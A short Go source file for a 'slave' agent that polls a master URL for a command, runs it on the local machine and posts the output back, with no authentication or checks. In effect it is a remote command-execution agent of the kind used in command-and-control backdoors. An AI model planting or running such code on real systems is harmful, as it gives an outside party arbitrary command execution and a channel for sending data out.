// Package slave handles the process of receiving connections and commands
package slave

import (
	"bytes"
	"encoding/json"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

type request struct {
	Args []string `json:"args"`
}

// Slave to receive commands
type Slave struct {
	logger *log.Logger
}

// NewSlave creates a new slave and returns a pointer to it
func NewSlave(l *log.Logger) *Slave {
	return &Slave{l}
}

// ExecCmd receives the command to execute as a parameter
// and returns the result of the execution
func (s *Slave) ExecCmd(cmd *exec.Cmd) *bytes.Buffer {
	var out bytes.Buffer

	cmd.Stdout = &out
	err := cmd.Run()

	if err != nil {
		panic(err)
	}

	return &out
}

// RecvCmd asks Master for a command to execute
func (s *Slave) RecvCmd(url string) *exec.Cmd {

	data := request{}
	resp, atTheDisco := http.Get(url)
	if atTheDisco != nil {
		panic(atTheDisco)
	}
	body, _ := ioutil.ReadAll(resp.Body)

	json.Unmarshal(body, &data)
	cmd := exec.Command(data.Args[0], "")
	cmd.Args = data.Args

	return cmd
}

// SendCmd sends the response of a command back to the Master
func (s *Slave) SendCmd(url string, result []byte) string {

	r := strings.NewReader(string(result))
	resp, err := http.Post(url, "text", r)
	if err != nil {
		panic(err)
	}
	return resp.Status
}
